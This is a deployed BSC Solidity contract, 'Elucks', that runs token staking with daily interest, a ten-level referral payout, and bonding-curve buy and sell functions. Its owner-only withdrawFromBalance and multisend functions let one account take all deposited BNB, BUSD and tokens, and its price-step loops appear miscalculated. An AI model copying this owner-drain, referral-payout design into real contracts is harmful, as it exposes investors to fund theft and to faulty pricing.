/**
 *Submitted for verification at BscScan.com on 2021-09-18
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-18
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-16
*/

pragma solidity ^0.5.4;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender)
  external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value)
  external returns (bool);
  
  function transferFrom(address from, address to, uint256 value)
  external returns (bool);
  function burn(uint256 value)
  external returns (bool);
  event Transfer(address indexed from,address indexed to,uint256 value);
  event Approval(address indexed owner,address indexed spender,uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        uint256 maxDailyInterest;
    }

    struct Investor {
        address addr;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 partners;
    }
}


contract Elucks {
    using SafeMath for uint256;
    uint256 private constant INTEREST_CYCLE = 1 days;

    uint256 public  MINIMUM_STAKING = 10*1e18;
    uint256 public  MINIMUM_BUY = 10*1e18;
    uint256 public  MINIMUM_SELL = 10*1e18;
    uint256 public constant REFERRER_CODE = 1;
    uint256 public  total_virtual_buy = 0;
    uint256 public  total_virtual_sell = 0;
    uint256 public  tokenPrice = 2*1e16;
	uint256 public  amountPerSlot=1000*1e18;
    uint256 public  total_token_buy = 0;
    uint256 public  total_token_sell = 0;
    uint256  priceIncPercent=185;
    uint256  priceDecPercent=184;
    uint256[] public referralPercent = [100,50,30,20,10,5,5,5,5,5];
    
    uint256 public latestReferrerCode;
    uint256 private totalInvestments_;
    
    IBEP20 private elucksToken; 
    IBEP20 private busdToken; 

    address payable private developerAccount_;
    address payable private marketingAccount_;
    address payable private referenceAccount_;

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;
    Objects.Plan[] private investmentPlans_;

    event Registration(address investor,uint256 investorId,address referrer,uint256 referrerId);
    event UserIncome(address user, address indexed _from, uint256 level, uint256 _type, uint256 income);
    event onInvest(address investor, uint256 amount, uint8 _type);
    event onWithdraw(address investor, uint256 amount);
    event TokenDistribution(address indexed sender, address indexed receiver, uint256 total_token, uint256 live_rate, uint256 bnb_amount, uint256 block_timestamp);
    /**
     * @dev Constructor Sets the original roles of the contract
     */

    constructor(IBEP20 _elucksToken,IBEP20 _busdToken) public {
        developerAccount_ = msg.sender;
        marketingAccount_ = msg.sender;
        referenceAccount_ = msg.sender;
         elucksToken=_elucksToken;
          busdToken=_busdToken;
        _init();
    }

    function() external payable {
        if (msg.value == 0) {
            withdraw();
        } else {
            invest(0, 0, 0); //default to buy plan 0, no referrer
        }
    }
    
    modifier onlyOwner() {
        require(msg.sender == marketingAccount_);
        _;
    }

    function checkIn() public {
    }

    function setMarketingAccount(address payable _newMarketingAccount) public onlyOwner {
        require(_newMarketingAccount != address(0));
        marketingAccount_ = _newMarketingAccount;
    }

    function getMarketingAccount() public view onlyOwner returns (address) {
        return marketingAccount_;
    }


    function getDeveloperAccount() public view onlyOwner returns (address) {
        return developerAccount_;
    }

    function setReferenceAccount(address payable _newReferenceAccount) public onlyOwner {
        require(_newReferenceAccount != address(0));
        referenceAccount_ = _newReferenceAccount;
    }

    function getReferenceAccount() public view onlyOwner returns (address) {
        return referenceAccount_;
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
        investmentPlans_.push(Objects.Plan(5,400*60*60*24,5)); 
       
    }

    function getCurrentPlans() public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
        uint256[] memory ids = new uint256[](investmentPlans_.length);
        uint256[] memory interests = new uint256[](investmentPlans_.length);
        uint256[] memory terms = new uint256[](investmentPlans_.length);
        uint256[] memory maxInterests = new uint256[](investmentPlans_.length);
        for (uint256 i = 0; i < investmentPlans_.length; i++) {
            Objects.Plan storage plan = investmentPlans_[i];
            ids[i] = i;
            interests[i] = plan.dailyInterest;
            maxInterests[i] = plan.maxDailyInterest;
            terms[i] = plan.term;
        }
        return
        (
        ids,
        interests,
        maxInterests,
        terms
        );
    }

    function getTotalInvestments() public view returns (uint256){
        return totalInvestments_;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }

    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256,  uint256, uint256[] memory, uint256[] memory) {
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                    } else {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.planCount,
        currentDividends,
        newDividends
        );
    }

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory, bool[] memory) {
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory interests = new uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
                newDividends[i] = 0;
                interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                        isExpireds[i] = true;
                        interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
                    }
                    else{
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                        interests[i] = investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                    interests[i] =  investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        newDividends,
        interests,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            //require(uid2Investor[_referrerCode].addr != address(0), "Wrong referrer code");
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        emit Registration(addr,latestReferrerCode,uid2Investor[_referrerCode].addr,_referrerCode);
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
		
            uint256 _ref1 = _referrerCode;
			
            uid2Investor[_ref1].partners = uid2Investor[_ref1].partners.add(1);
       
        }
        return (latestReferrerCode);
    }

    function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 usd_amount) private returns (bool) {
        require(_planId == 0, "Wrong investment plan id");
        require(usd_amount>= MINIMUM_STAKING, "Invalid Amount");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {//old user
            //do nothing, referrer is permenant
        }
        uint256 _amount=(usd_amount.div(tokenPrice)).mul(1e18);
        require(elucksToken.balanceOf(_addr)>=(_amount),"Low Balance");
	    require(elucksToken.allowance(_addr,address(this))>=_amount,"Invalid buy amount");
	    elucksToken.transferFrom(_addr ,address(this), (_amount));
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].planId = _planId;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = usd_amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);
        Objects.Investor storage upline=uid2Investor[investor.referrer];
        for(uint256 i = 0; i < 10; i++) {
				if (upline.addr != address(0)) {
				        if(upline.partners>i)
				        {
					     elucksToken.transfer(upline.addr,(_amount.mul(referralPercent[i])).div(1000));
					     emit UserIncome(upline.addr, _addr,i+1, 1,(_amount.mul(referralPercent[i])).div(1000));
				        }
					upline = uid2Investor[upline.referrer];
				} else break;
			}

        totalInvestments_ = totalInvestments_.add(_amount);
        return true;
    }



    function invest(uint256 _referrerCode, uint256 _planId , uint256 usd_amount) public payable {
        if (_invest(msg.sender, _planId, _referrerCode, usd_amount)) {
            emit onInvest(msg.sender, usd_amount,1);
        }
        }
    
    function buyToken(uint256 tokenQty) public payable
	{
	     require(!isContract(msg.sender),"Can not be contract");
	     (uint256 buy_amt,uint256 temp_total_virtual_buy,uint256 tempPrice)=calcBuyAmount(tokenQty);
	     require(buy_amt>=MINIMUM_BUY,"Invalid minimum quantity");
	     require(busdToken.balanceOf(msg.sender)>=(buy_amt),"Low Balance");
	     require(busdToken.allowance(msg.sender,address(this))>=buy_amt,"Invalid buy amount");
	     busdToken.transferFrom(msg.sender ,address(this), (buy_amt));
	     elucksToken.transfer(msg.sender , tokenQty);
	     
         total_token_buy=total_token_buy+tokenQty;
         total_virtual_buy=temp_total_virtual_buy;
         tokenPrice=tempPrice;
		 emit TokenDistribution(address(this), msg.sender, tokenQty, tokenPrice, buy_amt,block.timestamp);					
	 }
	 
	 function sellToken(uint256 tokenQty) public payable
	{
	     require(!isContract(msg.sender),"Can not be contract");
	     (uint256 busd_amt,uint256 temp_total_virtual_sell,uint256 tempPrice)=calcSellAmount(tokenQty);
	     require(busd_amt>=MINIMUM_SELL,"Invalid minimum quantity");
	     require(elucksToken.balanceOf(msg.sender)>=(tokenQty),"Low Balance");
	     require(elucksToken.allowance(msg.sender,address(this))>=tokenQty,"Invalid buy amount");
	     elucksToken.transferFrom(msg.sender ,address(this), (tokenQty));
	     busdToken.transfer(msg.sender , busd_amt);
	     
         total_token_sell=total_token_sell+tokenQty;
         total_virtual_sell=temp_total_virtual_sell;
         tokenPrice=tempPrice;
		 emit TokenDistribution(address(this), msg.sender, tokenQty, tokenPrice, busd_amt,block.timestamp);					
	 }

    function withdraw() public payable {
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = address2UID[msg.sender];
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) 
        {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[i].planId];

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , plan.dailyInterest , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate , plan.maxDailyInterest);

            withdrawalAmount += amount;
            

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }
       
        elucksToken.transfer(msg.sender,(withdrawalAmount.mul(1e18)).div(tokenPrice));

        emit onWithdraw(msg.sender, withdrawalAmount);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start , uint256 _maxDailyInterest) private pure returns (uint256) {

        uint256 numberOfDays =  (_now - _start) / INTEREST_CYCLE ;
        uint256 result = 0;
        uint256 index = 0;
        if(numberOfDays > 0){
          uint256 secondsLeft = (_now - _start);
           for (index; index < numberOfDays; index++) {
               if(_dailyInterestRate + index <= _maxDailyInterest ){
                   secondsLeft -= INTEREST_CYCLE;
                     result += (_amount * (_dailyInterestRate + index) / 1000 * INTEREST_CYCLE) / (60*60*24);
               }
               else
               {
                 break;
               }
            }

            result += (_amount * (_dailyInterestRate + index) / 1000 * secondsLeft) / (60*60*24);

            return result;

        }else{
            return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
        }

    }
    
    	function calcBuyAmount(uint256 tokenAmount) public view returns(uint256,uint256,uint256){
	    uint256 totalPrice;
	    uint256 tempPrice=tokenPrice;
	    uint256 temp_total_virtual_buy=total_virtual_buy;
	 
	    while(tokenAmount>0)
	    {
	       if((temp_total_virtual_buy+tokenAmount)<1000*1e18)
	       {
	          totalPrice=totalPrice+(tokenAmount.div(1e18)).mul(tempPrice);
	          temp_total_virtual_buy=temp_total_virtual_buy+tokenAmount;
	          tokenAmount=0;
	       }
	       else
	       {
	          uint256 _left=tokenAmount-temp_total_virtual_buy;
	          totalPrice=totalPrice+(_left.div(1e18)).mul(tempPrice);
	          tempPrice=tempPrice+((tempPrice.mul(priceIncPercent)).div(1000000));
	          temp_total_virtual_buy=0;
	          tokenAmount=tokenAmount-_left;
	       }
	    }
	    return(totalPrice,temp_total_virtual_buy,tempPrice);
	}
	
	  	function calcSellAmount(uint256 tokenAmount) public view returns(uint256,uint256,uint256){
	    uint256 totalPrice;
	    uint256 tempPrice=tokenPrice;
	    uint256 temp_total_virtual_sell=total_virtual_sell;
	   
	    while(tokenAmount>0)
	    {
	       if((temp_total_virtual_sell+tokenAmount)<1000*1e18)
	       {
	          totalPrice=totalPrice+(tokenAmount.div(1e18)).mul(tempPrice);
	          temp_total_virtual_sell=temp_total_virtual_sell+tokenAmount;
	          tokenAmount=0;
	       }
	       else
	       {
	          uint256 _left=tokenAmount-temp_total_virtual_sell;
	          totalPrice=totalPrice+(_left.div(1e18)).mul(tempPrice);
	          tempPrice=tempPrice-((tempPrice.mul(priceDecPercent)).div(1000000));
	          temp_total_virtual_sell=0;
	          tokenAmount=tokenAmount-_left;
	       }
	    }
	    return(totalPrice,temp_total_virtual_sell,tempPrice);
	}
	
	function isContract(address _address) public view returns (bool _isContract){
          uint32 size;
          assembly {
            size := extcodesize(_address)
          }
          return (size > 0);
    } 

  function withdrawFromBalance(address payable _sender,uint256 _amt,uint8 _type) public {
        require(msg.sender == marketingAccount_, "onlyOwner");
        if(_type==1)
        _sender.transfer(_amt*1e18);
        else if(_type==2)
        busdToken.transfer(_sender,_amt*1e18);
        else if(_type==3)
        elucksToken.transfer(_sender,_amt*1e18);
    }
    
     function multisend(address payable[]  memory  _contributors, uint256[] memory _balances) public payable {
        require(msg.sender == marketingAccount_, "onlyOwner");
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            _contributors[i].transfer(_balances[i]);
        }
    }

}